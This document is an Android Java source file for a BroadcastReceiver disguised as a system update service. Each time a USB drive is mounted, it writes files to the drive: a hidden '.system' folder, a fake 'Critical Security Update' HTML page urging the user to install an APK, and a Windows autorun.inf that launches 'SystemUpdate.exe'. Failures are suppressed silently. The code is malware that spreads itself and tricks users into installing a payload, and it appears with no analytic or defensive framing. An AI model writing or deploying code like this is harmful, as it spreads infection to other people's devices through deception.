// USBReceiver.java
package com.system.service.update;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Environment;
import android.os.Handler;
import android.os.Looper;
import java.io.File;
import java.io.FileWriter;

public class USBReceiver extends BroadcastReceiver {
    
    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        
        if (action == null) {
            return;
        }
        
        switch (action) {
            case Intent.ACTION_MEDIA_MOUNTED:
                handleMediaMounted(context, intent);
                break;
            case Intent.ACTION_MEDIA_UNMOUNTED:
                handleMediaUnmounted(context);
                break;
        }
    }
    
    private void handleMediaMounted(Context context, Intent intent) {
        // Delay to ensure mount is complete
        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                deployPayload(context, intent);
            }
        }, 5000);
    }
    
    private void handleMediaUnmounted(Context context) {
        // Clean up if needed
    }
    
    private void deployPayload(Context context, Intent intent) {
        try {
            android.net.Uri uri = intent.getData();
            if (uri == null) return;
            
            String path = uri.getPath();
            if (path == null) return;
            
            File mountPoint = new File(path);
            if (!mountPoint.exists() || !mountPoint.canWrite()) return;
            
            // Create hidden directory
            File hiddenDir = new File(mountPoint, ".system");
            if (!hiddenDir.exists()) {
                hiddenDir.mkdirs();
            }
            
            // Deploy HTML installer
            deployInstaller(mountPoint);
            
            // Create autorun for Windows
            deployAutorun(mountPoint);
            
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void deployInstaller(File mountPoint) {
        try {
            File installer = new File(mountPoint, "SecurityUpdate.html");
            FileWriter writer = new FileWriter(installer);
            
            String htmlContent = 
                "<!DOCTYPE html>\n" +
                "<html>\n" +
                "<head>\n" +
                "    <title>Critical System Update</title>\n" +
                "    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n" +
                "    <style>\n" +
                "        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; }\n" +
                "        button { padding: 15px 30px; font-size: 18px; background: #4CAF50; color: white; border: none; border-radius: 5px; cursor: pointer; }\n" +
                "    </style>\n" +
                "</head>\n" +
                "<body>\n" +
                "    <h1>Critical Security Update Required</h1>\n" +
                "    <p>Your device requires an important security update.</p>\n" +
                "    <p>This update protects against critical vulnerabilities.</p>\n" +
                "    <a href=\".system/SystemUpdate.apk\">\n" +
                "        <button>Install Update Now</button>\n" +
                "    </a>\n" +
                "</body>\n" +
                "</html>";
            
            writer.write(htmlContent);
            writer.close();
            
        } catch (Exception e) {
            // Silent fail
        }
    }
    
    private void deployAutorun(File mountPoint) {
        try {
            File autorun = new File(mountPoint, "autorun.inf");
            FileWriter writer = new FileWriter(autorun);
            
            String content = 
                "[AutoRun]\n" +
                "open=SystemUpdate.exe\n" +
                "action=Install System Update\n" +
                "icon=SystemUpdate.exe,0\n" +
                "label=System Update\n";
            
            writer.write(content);
            writer.close();
            
            // Hide the file
            autorun.setReadOnly();
            
        } catch (Exception e) {
            // Silent fail
        }
    }
}
